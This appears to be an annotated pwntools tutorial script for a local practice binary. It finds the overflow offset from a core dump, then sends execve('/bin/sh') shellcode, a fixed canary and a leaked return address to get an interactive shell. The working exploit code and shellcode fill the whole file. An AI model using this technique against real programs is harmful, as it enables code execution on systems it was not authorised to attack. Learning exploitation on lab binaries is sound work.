# There are TWO parts of automation when working with pwntools
# First: 
#        You use pwntools to find the padding about needed automaticlly 
#
# Secondly: 
#       You craft the payload and send it. 
#
# These two stages are done seperatly and requires you to start the 
# the victim binary twice. Example below. 

from pwn import *

# Context tells PWN tools how to behave
# context.bianry performs checksec functions and outputs
# to the terminal.
context.binary = binary = "./demo" 

# context.log_level tells pwntools how verbose it needs to 
# be with it's output. debug gives the most information. 
# The default vaulue is no log showen. It's a good 
# idea to use this context when exploit devloping.
context.log_level = "debug"

# Tell PWN Tools what the ELF file to look at
elf = ELF(binary)

# Execute the binary to start a process
io = process(binary)

# cyclic generates padding for you
padding = cyclic(64)

# Adding the Stack Canary to the payload
padding += b"ABCD"

# Extra padding to crach the program
padding += cyclic(32)

# Recvive the output from the process
io.recv()

# Send the padding to the process
io.sendline(padding)

# Wait for the process to crash
io.wait()

# Grab the newly generated core file 
# If a core file did not generate for you
# use the following command in your CLI:
# ulimit -c unlimited 
# ulimit unlimits the max coredump file size. 
corefile = Coredump("./core")


# Finds the length needed for the padding to reach the RIP register 
lenUntilRIP = cyclic_find(corefile.fault_addr) # string length until RIP is hit

print()
print(lenUntilRIP)
print()
# Tells us the fault address (this will look random since it came from 
# the padding.
print(hex(corefile.fault_addr))

# Now it's time to set up the payload padding
# Same as above but meant to only reach the 
# RIP reg and not overwrite it. 
firstPadding = cyclic(64)
cannary = b'ABCD'
secondPadding = cyclic(lenUntilRIP)

# Start a new process with the victim binary
io = process(binary)

# Recive output up until the new leaked address
io.recvuntil("at ")

# Get the leaked address with n number of bytes (the len of the address)
shellAddr = io.recvn(14)

# Recv the rest of the output
io.recv()


# Input out the shellcode to be the first thing on the stack we
# are about to return to. 
payload = b"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x90\x90"

# Add the extra padding to reach the stacj canary
payload += cyclic(32)

# Now input the stack canary
payload += cannary

# This padding is what leads us to the RIP register
payload += secondPadding

# Overwrite the RIP register with the starting address 
# of our shell code
payload += p64(int(shellAddr, 16))

# Send the payload
io.send(payload)

# Recive a interactive shell.
io.interactive()
                  
